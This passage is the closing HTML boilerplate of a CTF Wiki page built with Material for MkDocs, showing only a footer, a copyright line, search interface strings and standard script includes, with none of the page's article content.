24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing"}</script> <script>
        app = initialize({
          base: "../../../../../../..",
          features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
          search: Object.assign({
            worker: "../../../../../../../assets/javascripts/worker/search.e77c40e2.min.js"
          }, typeof search !== "undefined" && search),
          version: {}
        })
      </script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=https://ctf-wiki.org/static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>